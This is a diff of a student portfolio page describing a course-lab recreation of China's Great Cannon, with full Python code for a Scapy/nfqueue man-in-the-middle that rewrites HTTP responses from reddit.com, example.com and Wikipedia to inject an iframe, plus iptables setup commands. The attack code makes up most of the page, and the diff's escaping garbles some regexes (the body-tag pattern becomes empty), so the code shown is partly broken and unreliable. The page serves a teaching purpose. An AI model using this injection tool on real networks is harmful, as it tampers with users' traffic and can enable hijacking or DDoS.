@@ -1,86 +1,79 @@
 <!DOCTYPE HTML>
-<!--
-	Landed by HTML5 UP
-	html5up.net | @n33co
-	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
--->
 <html>
-	<head>
-		<title>Eui Won Kim | Snowman</title>
-		<meta name="author" content="Eui Won Kim">
-		<meta charset="utf-8" />
-		<link rel="shortcut icon" href="images/logoblack.png" type="image/x-icon">
-		<meta name="viewport" content="width=device-width, initial-scale=1" />
-		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
-		<link rel="stylesheet" href="assets/css/main.css" />
-	</head>
-	<body>
-		<div id="page-wrapper">
+<head>
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+	<title>Eui Won Kim | Snowman</title>
+	<meta content="Eui Won Kim" name="author" />
+	<link href="images/logoblack.png" rel="shortcut icon" type="image/x-icon" />
+	<meta content="width=device-width, initial-scale=1" name="viewport" /><!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
+	<link href="assets/css/main.css" rel="stylesheet" />
+</head>
+<body>
+<div id="page-wrapper"><!-- Header -->
+<header id="header">
+<h1 id="logo" style="margin-top: 5px"><a href="index.html"><img alt="" height="50px" src="images/johnekimlogo1.png" width="150px" /> </a></h1>
 
-			<!-- Header -->
-				<header id="header">
-					<h1 id="logo" style="margin-top: 5px"><a href="index.html"><img alt="" height="50px" src="images/johnekimlogo1.png" width="150px" /> </a></h1>				
-					<nav id="nav">
-						<ul>
-							<li><a href="about.html"><b>About</b></a></li>
-							<li>
-								<a href="#"><b>Projects</b></a>
-								<ul>
-									<li><a href="routie.html">Routie</a></li>
-									<li><a href="snowman.html">Study Buddy</a></li>
-									<li><a href="web.html">Personal Website</a></li>
-									<li><a href="elm.html">Elm</a></li>
-									<li><a href="cse.html">Lab Waitlist</a></li>
-									<li class="opener" style="-webkit-user-select: none; cursor: pointer; white-space: nowrap; opacity: 1;">
-										<a href="#" style="display: block;">Internet Security</a>
-										<ul style="-webkit-user-select: none; position: absolute; z-index: 1001; left: -167px; top: 103.703125px; opacity: 1; display: none;" class="dropotron level-1">
-											<li style="white-space: nowrap;"><a href="buffer.html" style="display: block;">Buffer&Integer Overflow</a></li>
-											<li style="white-space: nowrap;"><a href="heap.html" style="display: block;">Heap Spray</a></li>
-											<li style="white-space: nowrap;"><a href="china.html" style="display: block;">China's Great Cannon</a></li>
-											<li style="white-space: nowrap;"><a href="worm.html" style="display: block;">XSS & Profile Worm</a></li>
-										</ul>
-									</li>
-									<li><a href="cse.html">Recommendation Algorithm</a></li>
-								</ul>
-							</li>
-							<li><a href="resume.html"><b>Resume</b></a></li>
-							<li><a href="contact.html"><b>Contact</b></a></li>
+<nav id="nav">
+<ul>
+	<li><a href="index.html"><b>About</b></a></li>
+	<li><a href="#"><b>Projects</b></a>
+	<ul>
+		<li><a href="routie.html">Routie</a></li>
+		<li><a href="snowman.html">Study Buddy</a></li>
+		<li><a href="web.html">Personal Website</a></li>
+		<li><a href="elm.html">Elm</a></li>
+		<li><a href="cse.html">Lab Waitlist</a></li>
+		<li class="opener" style="-webkit-user-select: none; cursor: pointer; white-space: nowrap; opacity: 1;"><a href="#" style="display: block;">Internet Security</a>
+		<ul class="dropotron level-1" style="-webkit-user-select: none; position: absolute; z-index: 1001; left: -167px; top: 103.703125px; opacity: 1; display: none;">
+			<li style="white-space: nowrap;"><a href="buffer.html" style="display: block;">Buffer&amp;Integer Overflow</a></li>
+			<li style="white-space: nowrap;"><a href="heap.html" style="display: block;">Heap Spray</a></li>
+			<li style="white-space: nowrap;"><a href="china.html" style="display: block;">China&#39;s Great Cannon</a></li>
+			<li style="white-space: nowrap;"><a href="worm.html" style="display: block;">XSS &amp; Profile Worm</a></li>
+		</ul>
+		</li>
+		<li><a href="cse.html">Recommendation Algorithm</a></li>
+	</ul>
+	</li>
+	<li><a href="resume.html"><b>Resume</b></a></li>
+	<li><a href="contact.html"><b>Contact</b></a></li>
+</ul>
+</nav>
+</header>
+<!-- Main -->
 
-							
-						</ul>
-					</nav>
-				</header>
+<div class="wrapper style1" id="main">
+<div class="container">
+<header class="major">
+<h2><a><img alt="" height="154px" src="images/security.jpg" width="178px" /></a></h2>
 
-			<!-- Main -->
-				<div id="main" class="wrapper style1">
-					<div class="container">
-						<header class="major">
-							<h2><a><img src="images/security.jpg" height="154px" width="178px" alt="" /></a>
-</h2>
-							<h2>Recreation of China's Great Cannon.</h2>
-						</header>
-						
-							<p>Scapy was used to modify flying by packets with information such as TCP and DNS layers. The very firs thing we have to do was to make sure we find the right packet which the client is requesting, the domain. Since the DNS handshake is the very firs thing made, we look for a packet that is querying for the domain name thats specified in the runner.py. Then we save the src and dst IP. <br><br>
+<h2>Recreation of China&#39;s Great Cannon.</h2>
+</header>
 
-Then after the DNS hand shake was made, we look for any packets coming from the src IP that has GET or POST and check that the client is requesting the wanted URL of the domain. If that was found then we pase the following packets from the dst IP which will be the payload from the server we want to modify. <br><br>
+<p>Scapy was used to modify flying by packets with information such as TCP and DNS layers. The very firs thing we have to do was to make sure we find the right packet which the client is requesting, the domain. Since the DNS handshake is the very firs thing made, we look for a packet that is querying for the domain name thats specified in the runner.py. Then we save the src and dst IP.<br />
+<br />
+Then after the DNS hand shake was made, we look for any packets coming from the src IP that has GET or POST and check that the client is requesting the wanted URL of the domain. If that was found then we pase the following packets from the dst IP which will be the payload from the server we want to modify.<br />
+<br />
+While parsing through the TCP segmented data packets if we ever see a tag we replace that with the iframe and send the packet off to the client.<br />
+<br />
+For the packets with Content-Length, we just replace the length with old length + size of the iframe and were done.<br />
+<br />
+For more complicating Chunked-Encoded packets there were 2 cases.<br />
+<br />
+One was ther was only 1 chunk size for the whole packet data, for this case we just insert the iframe and create a new chunk at the end with the size of the iframe. The browser will decode it itself.<br />
+<br />
+For case two where there is multiple chunks in the tcp packet we manually iterate through each chunk and check for the body tag. If body tag was found we just inser a new chunk of size ifram at the end of that chunk and were done.<br />
+<br />
+In handling the actual data, we couldn&#39;t assume anything. All we had was that we&#39;d have a \R\N NUMBER \R\N DATA, and that could be split anywhere. What we didn&#39;t accoutn for was if \R\N was split up in between semgents or if the header was split between segments, or if the body tag was split between segments or chunks. Also, the packets had to come in order for this to work. I have to say it&#39;s a little bit silly to test on such a volatile environment, when we can&#39;t make our own test-friendly environment. After we&#39;re make sure that the packets we&#39;re getting are only data packets, and nothing else. We do this by getting the header packet that has a bit of data in it and only using that ack number. We strip the header, and start parsing the chunks. We make chunk objects that keep track of the data that it holds and how big it is. We also keep track of chunks that overflow into other segments by taking the size of the chunk, and comparing it to the data length. So in any case, we know where the data is. We don&#39;t just look for \R\N NUMBER \R\N because that could be in the actual data, and not a number. We keep a list of all these chunks. Next, we parse the packets and don&#39;t do anything with them until we find a body tag. Once we find a packet with a body tag, we know what chunk it&#39;s in. We want to take the last 70(the length of the frame url, not hard coded), and put that in a new small chunk, right after the end of the chunk taht the body is in. Then we can insert the frame url. However, if the next chunk header isn&#39;t in the current segment, we have to keep processing packets until we get to the next chunk header. We have to keep shifting around 70 from the beginning of the segments, and saving the end. If the body tag was within 70 of the chunk, we&#39;d have to only replace part of the frame url, and put the rest of the url, plus the body into the new chunk. These cases could also have happened together. And when we did this, we onyl edited the chunk objects, not the payload itself, so after each processed packet, we replaced the payload with a reconstruction of the list we have. We didn&#39;t need to create new chunk objects when we put in the frame, we simply edited teh chunk object data section, and the algorithm would put it together without knowing about it.</p>
 
-While parsing through the TCP segmented data packets if we ever see a </body> tag we replace that with the iframe and send the packet off to the client. <br><br>
+<div class="row">
+<div class="6u 12u(xsmall)" style="float: left;">
+<header>
+<h2></h2>
 
-For the packets with Content-Length, we just replace the length with old length + size of the iframe and were done.<br><br>
+<p>Target</p>
 
-For more complicating Chunked-Encoded packets there were 2 cases.<br><br>
-
-One was ther was only 1 chunk size for the whole packet data, for this case we just insert the iframe and create a new chunk at the end with the size of the iframe. The browser will decode it itself.<br><br>
-
-For case two where there is multiple chunks in the tcp packet we manually iterate through each chunk and check for the body tag. If body tag was found we just inser a new chunk of size ifram at the end of that chunk and were done. <br><br>
-
-In handling the actual data, we couldn't assume anything.  All we had was that we'd have a \R\N NUMBER \R\N DATA, and that could be split anywhere.  What we didn't accoutn for was if \R\N was split up in between semgents or if the header was split between segments, or if the body tag was split between segments or chunks.  Also, the packets had to come in order for this to work.  I have to say it's a little bit silly to test on such a volatile environment, when we can't make our own test-friendly environment.  After we're make sure that the packets we're getting are only data packets, and nothing else.  We do this by getting the header packet that has a bit of data in it and only using that ack number.  We strip the header, and start parsing the chunks.  We make chunk objects that keep track of the data that it holds and how big it is.  We also keep track of chunks that overflow into other segments by taking the size of the chunk, and comparing it to the data length.  So in any case, we know where the data is.  We don't just look for \R\N NUMBER \R\N because that could be in the actual data, and not a number.  We keep a list of all these chunks.  Next, we parse the packets and don't do anything with them until we find a body tag.  Once we find a packet with a body tag, we know what chunk it's in.  We want to take the last 70(the length of the frame url, not hard coded), and put that in a new small chunk, right after the end of the chunk taht the body is in.  Then we can insert the frame url.  However, if the next chunk header isn't in the current segment, we have to keep processing packets until we get to the next chunk header.  We have to keep shifting around 70 from the beginning of the segments, and saving the end.  If the body tag was within 70 of the chunk, we'd have to only replace part of the frame url, and put the rest of the url, plus the body into the new chunk.  These cases could also have happened together.  And when we did this, we onyl edited the chunk objects, not the payload itself, so after each processed packet, we replaced the payload with a reconstruction of the list we have.  We didn't need to create new chunk objects when we put in the frame, we simply edited teh chunk object data section, and the algorithm would put it together without knowing about it. </p>
-							<div class="row">
-								<div class="6u 12u(xsmall)" style="float: left;">
-								<header >
-									<h2><br></h2>
-									<p>Target</p>
-									<pre width="800px"><code >#!/usr/bin/env python
+<pre width="800px">
+<code style="height: 1200px">#!/usr/bin/env python
 
 import nfqueue
 import os
@@ -90,17 +83,17 @@ import sys
 
 import cannon
 
-TARGET_DOMAIN_RE = re.compile(r'(.+\.)*reddit\.com', re.I)
-IFRAME_URL = 'https://cseweb.ucsd.edu/classes/sp15/cse127-a/'
-URL_PATH_RE = re.compile(r'^/r/netsec$', re.I)
+TARGET_DOMAIN_RE = re.compile(r&#39;(.+\.)*reddit\.com&#39;, re.I)
+IFRAME_URL = &#39;https://cseweb.ucsd.edu/classes/sp15/cse127-a/&#39;
+URL_PATH_RE = re.compile(r&#39;^/r/netsec$&#39;, re.I)
 
-TARGET_DOMAIN_RE1 = re.compile(r'(.+\.)*example\.com', re.I)
-IFRAME_URL1 = 'https://cseweb.ucsd.edu/classes/sp15/cse127-a/'
-URL_PATH_RE1 = re.compile(r'^/r$', re.I)
+TARGET_DOMAIN_RE1 = re.compile(r&#39;(.+\.)*example\.com&#39;, re.I)
+IFRAME_URL1 = &#39;https://cseweb.ucsd.edu/classes/sp15/cse127-a/&#39;
+URL_PATH_RE1 = re.compile(r&#39;^/r$&#39;, re.I)
 
-TARGET_DOMAIN_RE2 = re.compile(r'(.+\.)*en.wikipedia\.org', re.I)
-IFRAME_URL2 = 'https://cseweb.ucsd.edu/classes/sp15/cse127-a/'
-URL_PATH_RE2 = re.compile(r'^/wiki/Main_Page$', re.I)
+TARGET_DOMAIN_RE2 = re.compile(r&#39;(.+\.)*en.wikipedia\.org&#39;, re.I)
+IFRAME_URL2 = &#39;https://cseweb.ucsd.edu/classes/sp15/cse127-a/&#39;
+URL_PATH_RE2 = re.compile(r&#39;^/wiki/Main_Page$&#39;, re.I)
 
 reddit = cannon.Cannon(TARGET_DOMAIN_RE, URL_PATH_RE, IFRAME_URL)
 example = cannon.Cannon(TARGET_DOMAIN_RE1, URL_PATH_RE1, IFRAME_URL1)
@@ -108,14 +101,14 @@ wiki = cannon.Cannon(TARGET_DOMAIN_RE2, URL_PATH_RE2, IFRAME_URL2)
 
 def main():
   if os.getuid() != 0:
-    sys.exit('You need to run as root. Use sudo.')
+    sys.exit(&#39;You need to run as root. Use sudo.&#39;)
 
-  os.system('sudo ethtool -K eth0 gro off')
-  os.system('sudo ethtool -K eth1 gro off')
-  os.system('sudo iptables -F FORWARD')
-  os.system('sudo iptables -t mangle -A FORWARD -j NFQUEUE --queue-num 1')
-  os.system('sudo iptables -t filter -A OUTPUT -m owner --gid-owner user -j DROP')
-  os.system('sudo iptables -t mangle -A POSTROUTING -p tcp --syn -j TCPMSS --set-mss 1200')
+  os.system(&#39;sudo ethtool -K eth0 gro off&#39;)
+  os.system(&#39;sudo ethtool -K eth1 gro off&#39;)
+  os.system(&#39;sudo iptables -F FORWARD&#39;)
+  os.system(&#39;sudo iptables -t mangle -A FORWARD -j NFQUEUE --queue-num 1&#39;)
+  os.system(&#39;sudo iptables -t filter -A OUTPUT -m owner --gid-owner user -j DROP&#39;)
+  os.system(&#39;sudo iptables -t mangle -A POSTROUTING -p tcp --syn -j TCPMSS --set-mss 1200&#39;)
 
   try:
     nf =  reddit#annon.Cannon(TARGET_DOMAIN_RE, URL_PATH_RE, IFRAME_URL)
@@ -132,27 +125,31 @@ def main():
       q.unbind(AF_INET)
       q.close()
   except KeyboardInterrupt:
-    print 'Ctrl-C received'
+    print &#39;Ctrl-C received&#39;
   finally:
-    os.system('sudo iptables -F FORWARD -t mangle')
-    os.system('sudo iptables -F OUTPUT -t filter')
-    os.system('sudo iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT')
-    os.system('sudo iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT')
+    os.system(&#39;sudo iptables -F FORWARD -t mangle&#39;)
+    os.system(&#39;sudo iptables -F OUTPUT -t filter&#39;)
+    os.system(&#39;sudo iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT&#39;)
+    os.system(&#39;sudo iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT&#39;)
 
 
-if __name__ == '__main__':
-  print '\n*************************************** starting\n'
+if __name__ == &#39;__main__&#39;:
+  print &#39;\n*************************************** starting\n&#39;
   main()
 
 
 									</code></pre>
-									</header>
-								</div>
-								<div class="6u 12u(xsmall)" style="float: right;">
-								<header >
-									<h2> <br></h2>
-									<p>Exploit</p>
-									<pre width="800px"><code >import nfqueue
+</header>
+</div>
+
+<div class="6u 12u(xsmall)" style="float: right;">
+<header>
+<h2></h2>
+
+<p>Exploit</p>
+
+<pre width="800px">
+<code style="height: 1200px">import nfqueue
 import re
 import sys
 from scapy.all import * # IP, UDP, DNS, DNSRR, TCP
@@ -168,24 +165,24 @@ EDITING = 3
 EXAMPLE = 4
 NORMAL = 5
 CHUNKED = 6
-RN = '\r\n'
+RN = &#39;\r\n&#39;
 
 class Cannon(object):
   def __init__(self, target_domain_re, url_path_re, iframe_url):
     self.target_domain_re = target_domain_re
     self.url_path_re = url_path_re
-    self.iframe_url = "&#60;iframe src=\""+iframe_url+"\"&#62;&#60;/iframe&#62;"
+    self.iframe_url = &quot;&lt;iframe src=\&quot;&quot;+iframe_url+&quot;\&quot;&gt;&lt;/iframe&gt;&quot;
     self.len = len(self.iframe_url)
     self.target = 0 
-    self.dst = ''
-    self.src = ''
+    self.dst = &#39;&#39;
+    self.src = &#39;&#39;
     self.chunkSize = 0
     self.body = 0 
     self.status = NORMAL
     self.found = False
     self.list = []
     self.processed = 0
-    self.previous = ''
+    self.previous = &#39;&#39;
     self.number = -1
     self.counter = 0
     self.firstTime = True
@@ -217,7 +214,7 @@ class Cannon(object):
       self.pass_through(payload)
 
     elif self.target == IP_CHECK and self.hasPath(pkt): #check for path, if thats good
-      print "=========== hasPath"
+      print &quot;=========== hasPath&quot;
       self.target = EDITING
       return
     elif self.target == EDITING:
@@ -236,7 +233,7 @@ class Cannon(object):
       # start checking the sequence 
       for i in self.seqlist:
         if pkt[TCP].payload == i:
-          #print '=======  In the seq table'
+          #print &#39;=======  In the seq table&#39;
           #print pkt[TCP].payload
           self.pass_through(payload)
           return
@@ -246,17 +243,17 @@ class Cannon(object):
 
       # If the Packet has a Content-Length Edit it
       if self.status == NORMAL and self.hasContentLength(pkt) and not self.isChunked(pkt):
-        print 'should never go in here'
+        print &#39;should never go in here&#39;
         self.editContentLength(pkt)
         if self.hasEndBody(pkt):
           self.editBodyTag(pkt)
         else:
-          print 'status being set'
+          print &#39;status being set&#39;
           self.status = EXAMPLE
         self.ack(pkt, payload)
         return
       if self.status == EXAMPLE and self.hasEndBody(pkt):
-        print 'johns check'
+        print &#39;johns check&#39;
         self.editBodyTag(pkt)
         self.status = NORMAL
         self.ack(pkt, payload)
@@ -271,10 +268,10 @@ class Cannon(object):
         return
 
       if self.isChunked(pkt):  #means theres a header in there
-        print '-header packet'
+        print &#39;-header packet&#39;
         self.status == CHUNKED
         if self.endOfPacket(pkt):
-          print '-end of packet'
+          print &#39;-end of packet&#39;
           
           print data
           self.pass_through(payload)
@@ -286,26 +283,26 @@ class Cannon(object):
           return
         else:
           #print listt[1]
-          if len(listt[1]) < 2:
+          if len(listt[1]) &lt; 2:
             self.pass_through(payload)
             return
 
       
-      dataHeader = ''
-      if data == '': 
+      dataHeader = &#39;&#39;
+      if data == &#39;&#39;: 
         self.pass_through(payload)
         return
 
       
 
-      #print "data packet here ->"
+      #print &quot;data packet here -&gt;&quot;
       #print data
       
       if self.firstTime:
         self.filterAck = pkt[TCP].ack
         split = data.split(RN + RN)
         dataHeader = split[0]
-        print '===========dataheader'
+        print &#39;===========dataheader&#39;
         data = data[len(dataHeader) + 1:]
       #print data
       if not self.processPayload(data):
@@ -313,16 +310,16 @@ class Cannon(object):
         return
 
       if self.found and not self.hasEndBody(pkt):
-        if len(self.list) == 1 and self.list[0].size == -1:  #it doesn't have CSH
+        if len(self.list) == 1 and self.list[0].size == -1:  #it doesn&#39;t have CSH
           payload_len = len(pkt[TCP].payload)
-          if payload_len > self.len:
+          if payload_len &gt; self.len:
             self.previous = self.list[0].pushFront(self.previous)  #pushFront returns the replaced content
           else: #the chunk in this entire segment is smaller than LEN
             toReplace = self.previous[:payload_len]
             pushout = self.list[0].pushFront(toReplace)
             self.previous = self.previous[payload_len:] + pushout
         else:  #there is a CH
-          if self.processed < len(self.previous):
+          if self.processed &lt; len(self.previous):
             pushout = self.list[0].pushFront(self.previous)
             self.list[0].addChunk(pushout)
           else:
@@ -330,22 +327,22 @@ class Cannon(object):
             pushout = self.list[0].pushFront(replaceChunk)
             newChunk = self.previous[self.processed:] + pushout
             self.list[0].addChunk(newChunk)
-          print 'first cleanup'
+          print &#39;first cleanup&#39;
           self.cleanupChunked()
         self.adjustPayload(pkt, dataHeader)
         self.ack(pkt, payload)
       elif not self.hasEndBody(pkt):
-        print '-didnt have an endbody'
+        print &#39;-didnt have an endbody&#39;
         self.firstTime = False
         self.counter -= 1
         self.pass_through(payload)
         return
       else: #found the body tag
-        print '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@done bitches'
+        print &#39;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@done bitches&#39;
         self.found = True
-        bodyReg = re.compile(r'</body>',re.IGNORECASE)
+        bodyReg = re.compile(r&#39;&#39;,re.IGNORECASE)
 
-        bodyTag = bodyReg.search(data).group()  #essentially </body>
+        bodyTag = bodyReg.search(data).group()  #essentially 
 
         bodyPos = data.find(bodyTag)
 
@@ -357,7 +354,7 @@ class Cannon(object):
         if chunkIndex + 1 != len(self.list):  #if theres a chunk header after the last one
           nextChunkStart = bodyChunk.dataLoc + len(bodyChunk.data) 
           bodyToChunkLen = nextChunkStart - bodyPos
-          if bodyToChunkLen < self.len:
+          if bodyToChunkLen &lt; self.len:
             endOfChunk = bodyChunk.data[-bodyToChunkLen:]
             beg_frame = self.iframe_url[:bodyToChunkLen]
             end_frame = self.iframe_url[bodyToChunkLen:]
@@ -368,12 +365,12 @@ class Cannon(object):
             bodyChunk.data = bodyChunk.sub[:bodyChunk.size - self.len]
             bodyChunk.data = bodyChunk.data.replace(bodyTag, self.iframe_url+bodyTag)
             bodyChunk.addChunk(endOfChunk)
-          print 'cleanup 2'
+          print &#39;cleanup 2&#39;
           self.adjustPayload(pkt, dataHeader)
           self.cleanupChunked()
         else: #this is the last chunk in the segment, and the rest is in the next one
           chunkDataLen = len(bodyChunk.data)
-          if chunkDataLen < self.len:
+          if chunkDataLen &lt; self.len:
             beg_frame = self.iframe_url[:chunkDataLen]
             end_frame = self.iframe_url[chunkDataLen:]
             pushout = bodyChunk.pushFront(beg_frame)
@@ -387,13 +384,13 @@ class Cannon(object):
         self.ack(pkt, payload)
 
   def isMoved(self, data):
-    return 'HTTP/1.1 301 Moved Permanently' in data
+    return &#39;HTTP/1.1 301 Moved Permanently&#39; in data
 
 
   def adjustPayload(self, pkt, dataHeader):
     self.counter -= 1
     if(self.counter != 0):
-      print 'adjustpayload not being called all the time'
+      print &#39;adjustpayload not being called all the time&#39;
       print self.counter
       sys.exit()
     self.firstTime = False
@@ -413,7 +410,7 @@ class Cannon(object):
   def endOfPacket(self, pkt):
     data = str(pkt[TCP].payload)
 
-    hasDataList = data.split('\r\n\r\n')
+    hasDataList = data.split(&#39;\r\n\r\n&#39;)
 
     if len(hasDataList) == 1:
       return False
@@ -440,7 +437,7 @@ class Cannon(object):
     self.found = False
     self.list = []
     self.processed = 0
-    self.previous = ''
+    self.previous = &#39;&#39;
     self.seqlist = []
     self.firstTime = True
     self.target = BEGIN
@@ -451,8 +448,8 @@ class Cannon(object):
     tcp = pkt[TCP]
     tcp_str = str(tcp.payload)
     weblen = 24 + len(self.iframe_url)
-    static_str = 'THER'
-    body = re.compile(r'</body>',re.IGNORECASE)
+    static_str = &#39;THER&#39;
+    body = re.compile(r&#39;&#39;,re.IGNORECASE)
     tag = (body.search(tcp_str)).group() 
     name = self.iframe_url
     tcp_str = tcp_str.replace(tag, name + tag)
@@ -465,24 +462,24 @@ class Cannon(object):
     self.packetCount += 1
     self.counter += 1
     processed = self.processed
-    print 'processpayload count = ' + str(self.packetCount)
+    print &#39;processpayload count = &#39; + str(self.packetCount)
     print payload[:15]
     self.list = []
    
     #print payload
-    if len(payload) <= self.processed:
+    if len(payload) &lt;= self.processed:
       #corner case of counting the length of the chunk header
       self.processed = self.processed - len(payload)
       return True
 
-    if self.processed > 0:
-      print "-chunk was cut off from previous segment"
-      if self.processed > len(payload):
-        print '-no chunk header in here, off to next segment'
-        self.list.append(Chunk(-1,'j', payload, 0))
+    if self.processed &gt; 0:
+      print &quot;-chunk was cut off from previous segment&quot;
+      if self.processed &gt; len(payload):
+        print &#39;-no chunk header in here, off to next segment&#39;
+        self.list.append(Chunk(-1,&#39;j&#39;, payload, 0))
         return True
-      print '- theres going to be a chunk header after this completed sgement'
-      self.list.append(Chunk(-1,'j', payload[0:self.processed], 0))
+      print &#39;- theres going to be a chunk header after this completed sgement&#39;
+      self.list.append(Chunk(-1,&#39;j&#39;, payload[0:self.processed], 0))
 
     stayIn = True
     begin = self.processed
@@ -492,20 +489,20 @@ class Cannon(object):
 
       probNumber = payload[pos1 + 2:pos2]
       chunk_size = 0
-      #hexa = re.compile(r'[a-f0-9]+')
+      #hexa = re.compile(r&#39;[a-f0-9]+&#39;)
       #if hexa.match(payload[pos1 + 2:pos2]) == None:
       try:
         chunk_size = int(probNumber, 16)
       except ValueError:
-        print '==================='
+        print &#39;===================&#39;
         print probNumber
-        print '==================='
+        print &#39;===================&#39;
         #print payload
         self.counter -= 1
         self.packetCount -= 1
         self.processed = processed
         return False
-      print 'chunk size is ' + probNumber + ' - > ' + str(chunk_size)
+      print &#39;chunk size is &#39; + probNumber + &#39; - &gt; &#39; + str(chunk_size)
       
       if chunk_size == 0:
         self.list.append(Chunk(chunk_size, probNumber, RN, len(payload) - 1))
@@ -513,20 +510,20 @@ class Cannon(object):
         return True
 
       begin = pos2 + 2 + chunk_size
-      if begin > len(payload):  #bounds checking
+      if begin &gt; len(payload):  #bounds checking
         begin = len(payload)
         stayIn = False
       
       chunk_data = payload[pos2+2: begin]
-      print 'beginning of chunk size data is ' + chunk_data[:15]  #might go out of bounds in corner cases
+      print &#39;beginning of chunk size data is &#39; + chunk_data[:15]  #might go out of bounds in corner cases
 
       self.list.append(Chunk(chunk_size, probNumber, chunk_data, pos2 + 2))
       
-      print '-processed'
+      print &#39;-processed&#39;
     lastChunk = self.list[-1]
     self.processed = lastChunk.size - len(lastChunk.data)
-    print 'to process in next segement = ' + str(self.processed)
-    if self.processed < 0:
+    print &#39;to process in next segement = &#39; + str(self.processed)
+    if self.processed &lt; 0:
       sys.exit()
     return True
 
@@ -534,7 +531,7 @@ class Cannon(object):
     tcp = pkt[TCP]
     tcp_str = tcp.payload
 
-    hexa_reg = re.compile(r'\r\n[a-f0-9]+\r\n?')
+    hexa_reg = re.compile(r&#39;\r\n[a-f0-9]+\r\n?&#39;)
 
     if hexa_reg.search(tcp_str) == None:
       return False
@@ -545,13 +542,13 @@ class Cannon(object):
     tcp_str = str(tcp.payload)
     weblen = 24 + len(self.iframe_url)
 
-    hexa_reg = re.compile(r'\r\n[a-f0-9]+\r\n?')
+    hexa_reg = re.compile(r&#39;\r\n[a-f0-9]+\r\n?&#39;)
 
     hexa_ex = hexa_reg.search(tcp_str).group()
-    #hexa_str = hexa_ex.strip('\r\n')
+    #hexa_str = hexa_ex.strip(&#39;\r\n&#39;)
     #hexa_len = len(hexa_ex) + weblen # length we want to push
     pos = tcp_str.index(hexa_ex)
-    tcp_str = tcp_str.replace(hexa_ex, '') # remove the current CS
+    tcp_str = tcp_str.replace(hexa_ex, &#39;&#39;) # remove the current CS
     offset = pos + weblen
     tcp_str = tcp_str[:offset]+ hexa_ex +tcp_str[offset:] # pushing
 
@@ -563,26 +560,26 @@ class Cannon(object):
     tcp = pkt[TCP]
     tcp_str = str(tcp.payload)
     
-    encoding = ''
-    encoding_reg = re.compile(r'Transfer-Encoding: \w+')
+    encoding = &#39;&#39;
+    encoding_reg = re.compile(r&#39;Transfer-Encoding: \w+&#39;)
     encoding_ex = encoding_reg.search(tcp_str)
     if encoding_ex == None:
       return False
-    print "======== Chunk has Transfer-Encoding" 
-    encoding = (encoding_ex.group()).split(' ')[1]
-    if encoding != 'chunked':
+    print &quot;======== Chunk has Transfer-Encoding&quot; 
+    encoding = (encoding_ex.group()).split(&#39; &#39;)[1]
+    if encoding != &#39;chunked&#39;:
       return False
-    print "========= found chunk size"
+    print &quot;========= found chunk size&quot;
     return True
 
   def isChunkeddd(self, pkt):
     tcp = pkt[TCP]
     tcp_str = str(tcp.payload)
 
-    hexa = tcp_str.split('\r\n\r\n')[1]
-    hexa_reg = re.compile(r'[a-f0-9]+\r\n?')
+    hexa = tcp_str.split(&#39;\r\n\r\n&#39;)[1]
+    hexa_reg = re.compile(r&#39;[a-f0-9]+\r\n?&#39;)
     hexa_ex = hexa_reg.search(hexa)
-    if not ((hexa_ex != None) and hexa.splitlines()[0] !='0'):
+    if not ((hexa_ex != None) and hexa.splitlines()[0] !=&#39;0&#39;):
       return False
  
   def setIP(self, pkt):
@@ -590,7 +587,7 @@ class Cannon(object):
       return False
     tcp = pkt[TCP]
     flag = tcp.flags
-    if not (flag & 2 and flag & 16): # Syn Ack packet
+    if not (flag &amp; 2 and flag &amp; 16): # Syn Ack packet
       return False
     return True
 
@@ -600,11 +597,11 @@ class Cannon(object):
     tcp = pkt[TCP]
     tcp_str = str(tcp.payload)
 
-    contLen = re.compile(r'Content-Length: \d+')
+    contLen = re.compile(r&#39;Content-Length: \d+&#39;)
     sys.stdout.flush()
     if contLen.search(tcp_str) == None:
       return False
-    print "========= has content length"
+    print &quot;========= has content length&quot;
     return True
 
   def editContentLength(self, pkt):
@@ -612,32 +609,32 @@ class Cannon(object):
     tcp = pkt[TCP]
     tcp_str = str(tcp.payload)
     weblen = 24 + len(self.iframe_url)
-    static_str = 'THEREONCEWASAPRETTYBOYNAMEPRINCEHEWASVERYSHYANDHELIVEDINAHOLE' 
+    static_str = &#39;THEREONCEWASAPRETTYBOYNAMEPRINCEHEWASVERYSHYANDHELIVEDINAHOLE&#39; 
 
-    contLen = re.compile(r'Content-Length: \d+')
-    contLenNumReg = re.compile(r'\d+')
+    contLen = re.compile(r&#39;Content-Length: \d+&#39;)
+    contLenNumReg = re.compile(r&#39;\d+&#39;)
     contLenReg = contLen.search(str(tcp.payload)) 
     contLenLen = 0 
 
     if (contLenReg != None):
-      print "========== Cont Regex =========="
+      print &quot;========== Cont Regex ==========&quot;
       static_str = contLenReg.group()
       contLenNum = contLenNumReg.search(static_str)
       contLenLen = int(contLenNum.group())
     
-    tcp.payload = tcp_str.replace(static_str, "Content-Length: "+str(contLenLen+weblen))
+    tcp.payload = tcp_str.replace(static_str, &quot;Content-Length: &quot;+str(contLenLen+weblen))
     contLenReg2 = contLen.search(tcp_str)
 
   def hasEndBody(self, pkt):
 
     tcp = pkt[TCP]
     tcp_str = str(tcp.payload)
-    body = re.compile(r'</body>',re.IGNORECASE)
+    body = re.compile(r&#39;&#39;,re.IGNORECASE)
 
 
     if body.search(tcp_str) == None:
       return False
-    print "========= Has a body Tag"
+    print &quot;========= Has a body Tag&quot;
     return True
 
   def ack(self, pkt, payload):
@@ -649,12 +646,12 @@ class Cannon(object):
       return False
     tcp = pkt[TCP]
     tcp_str = str(tcp.payload)
-    if not (tcp_str.startswith("GET ") or tcp_str.startswith("POST ")):  ######################
+    if not (tcp_str.startswith(&quot;GET &quot;) or tcp_str.startswith(&quot;POST &quot;)):  ######################
       return False
     #if not tcp.flags == 24:  # Get packe?t
     #  return False
     line = tcp_str.splitlines()[0] # get the firs tline
-    newline = line.split(' ')
+    newline = line.split(&#39; &#39;)
     if self.url_path_re.match(newline[1]) == None:
       return False
     self.dst = pkt[IP].dst # set the dest ip
@@ -694,8 +691,8 @@ class Cannon(object):
 
     payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))  
 
